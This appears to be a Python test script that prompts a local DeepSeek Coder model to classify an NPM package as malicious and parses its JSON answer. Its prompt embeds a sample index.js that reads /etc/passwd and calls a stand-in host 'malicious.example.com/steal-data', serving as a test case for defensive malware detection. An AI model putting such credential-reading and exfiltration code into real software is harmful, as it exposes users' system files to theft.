import re
import os
import sys
from pathlib import Path
from typing import Any, Dict, Optional
import time, json

# Pin sang GPU 1 (còn ~1.8 GiB free) trước khi import torch
# Đổi thành "0" nếu muốn dùng GPU 0
os.environ["CUDA_VISIBLE_DEVICES"] = "0"

project_root = Path(__file__).parent.parent
sys.path.insert(0, str(project_root))

try:
    from src.models.providers.deepseek_adapter import DeepSeekAdapter
    print("Successfully imported deepseek_adapter\n")
except ImportError as e:
    print(f"Import error: {e}")
    sys.exit(1)


# ---------------------------------------------------------------------------
# JSON extraction helpers
# ---------------------------------------------------------------------------

def _clean_bpe(text: str) -> str:
    text = text.replace('\u0120', ' ').replace('\u010a', '\n')
    result = []
    for ch in text:
        cp = ord(ch)
        if 0x0100 <= cp <= 0x017F:
            ab = cp - 0x0100
            result.append(chr(ab) if 0x20 <= ab <= 0x7E else ('\n' if ab == 0x0A else ch))
        else:
            result.append(ch)
    return ''.join(result)


def _safe_repair_json(text: str) -> Optional[Dict[str, Any]]:
    res = text
    res = re.sub(r',\s*}', '}', res)
    res = re.sub(r',\s*]', ']', res)
    res = re.sub(r"'(\w+)'\s*:", r'"\1":', res)
    res = re.sub(r":\s*'([^']*?)'\s*([,}])", r': "\1"\2', res)
    res = re.sub(r'//.*?$', '', res, flags=re.MULTILINE)
    res = re.sub(r'/\*.*?\*/', '', res, flags=re.DOTALL)
    try:
        return json.loads(res)
    except json.JSONDecodeError:
        return None


def _extract_first_json(text: str) -> Optional[Dict[str, Any]]:
    start = text.find('{')
    if start == -1:
        return None
    depth = 0
    for i, ch in enumerate(text[start:], start):
        if ch == '{':
            depth += 1
        elif ch == '}':
            depth -= 1
            if depth == 0:
                candidate = text[start:i+1]
                try:
                    return json.loads(candidate)
                except json.JSONDecodeError:
                    return _safe_repair_json(candidate)
    return None


def _extract_from_markdown(text: str) -> Optional[Dict[str, Any]]:
    patterns = [
        r"```json\s*([\s\S]*?)\s*```",
        r"```(?:javascript|js|ts|typescript)\s*([\s\S]*?)\s*```",
        r"```\s*([\s\S]*?)\s*```",
    ]
    for pattern in patterns:
        for block in re.findall(pattern, text, re.DOTALL | re.IGNORECASE):
            block = block.strip()
            if not block.startswith('{'):
                continue
            try:
                return json.loads(block)
            except json.JSONDecodeError:
                result = _extract_first_json(block)
                if result:
                    return result
                result = _safe_repair_json(block)
                if result:
                    return result
    return None


def parse_output(raw: str) -> Optional[Dict[str, Any]]:
    text = _clean_bpe(raw)
    data = _extract_first_json(text)
    if data:
        print("[OK] Parsed via _extract_first_json")
        return data
    data = _extract_from_markdown(text)
    if data:
        print("[OK] Parsed via _extract_from_markdown")
        return data
    return None


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    config = {
        "torch_dtype": "float16",
        "device_map": "auto",     # HF auto fix GPU have enough VRAM
        "load_in_4bit": True,
        "max_new_tokens": 4096,
        "do_sample": False,
    }

    adapter = DeepSeekAdapter(
        model_name="./models/deepseek-coder-6.7b-instruct",
        config=config
    )

    prompt = r"""
You are a cybersecurity expert specialized in analyzing NPM packages for malicious behavior.
You are given package metadata and a short JavaScript file. Your task is to FILL THE JSON SKELETON BELOW based ONLY on the provided files.

IMPORTANT RULES — FOLLOW EXACTLY:
1) Return EXACTLY one JSON object, nothing else (no explanation, no markdown, no leading/trailing text).
2) The JSON keys MUST be exactly:
"package_name", "behaviors", "suspicious_patterns", "evidence", "confidence"
3) If there are no behaviors or patterns, return empty lists/dicts (do not write "null" or text).
4) Do NOT invent any extra keys or top-level fields.
5) Use conservative confidences: if unsure, choose a low confidence (e.g., 0.15-0.4).
6) The "confidence" field is a float in [0,1] summarizing aggregated confidence.
7) All behaviors MUST be objects with keys: "id", "category", "summary", "details", "confidence".
8) In "evidence" include { "file": "...", "line": N, "snippet": "..." } entries where applicable.
9) If you cannot find any suspicious behavior, return the skeleton with empty lists and confidence 0.0.

JSON SKELETON (fill values only):
{
"package_name": "",
"behaviors": [],
"suspicious_patterns": [],
"evidence": {},
"confidence": 0.0
}

Now analyze the package below and FILL the skeleton above exactly.

===PACKAGE.JSON===
{"name": "example-malicious", "version":"1.0.0"}

===FILE: index.js===
const fs = require('fs');
const https = require('https');
fs.readFileSync('/etc/passwd', 'utf-8');
https.get('http://malicious.example.com/steal-data', res => {});
"""

    t0 = time.time()
    raw = adapter.generate(prompt, max_new_tokens=4096)
    t1 = time.time()

    print(f"Time (s): {t1 - t0:.2f}")
    print(f"Raw output (first 300 chars):\n{repr(raw[:300])}\n")

    data = parse_output(raw)
    if data:
        print("Parsed JSON:\n", json.dumps(data, indent=2))
    else:
        out_path = Path("/tmp/model_output.txt")
        out_path.write_text(raw)
        print(f"[FAIL] Could not parse JSON. Full output saved to {out_path}")


if __name__ == "__main__":
    main()